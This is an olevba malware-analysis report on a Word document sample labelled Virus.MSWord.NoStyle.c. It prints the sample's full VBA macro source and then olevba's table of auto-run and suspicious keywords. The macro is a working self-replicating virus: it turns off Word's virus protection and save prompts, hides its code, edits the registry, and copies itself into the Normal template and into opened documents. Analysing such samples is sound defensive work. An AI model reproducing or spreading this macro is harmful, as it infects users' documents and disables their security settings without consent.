olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.NoStyle.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.NoStyle.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open(): On Error Resume Next: Application.EnableCancelKey = 0
mig:
Application.ShowVisualBasicEditor = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0: ActiveDocument.ReadOnlyRecommended = 0: Application.ScreenUpdating = 0
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office", "CodeBackColors") = "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office", "CodeForeColors") = "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"
Set WshShell = CreateObject("WScript.Shell"): WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office\EndProcLine", 0, "REG_DWORD"
If ActiveDocument.ReadOnly = 1 Then: SetAttr ActiveDocument.FullName, 0: ActiveDocument.Reload
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) = "mig:" Then DOT = True
If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) = "mig:" Then DOC = True
If DOT = True And DOC = True Then GoTo 1
If DOT = False Then
VV = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
With NormalTemplate.VBProject.VBComponents.Item(1).CodeModule: .DeleteLines 1, .CountOfLines: .AddFromString VV: End With
End If
If DOC = False Then
CC = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule: .DeleteLines 1, .CountOfLines: .AddFromString CC: End With
End If
If ActiveDocument.FullName = wdOpenFormatDocument Then ActiveDocument.SaveAs ActiveDocument.FullName
1: ActiveDocument.Saved = True
End Sub
Private Sub Document_Close(): On Error Resume Next: If ActiveDocument.Name = ActiveDocument.FullName Then End
If ActiveDocument.Saved = True Then Call Document_Open Else End
End Sub 'VOVAN//SMF
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

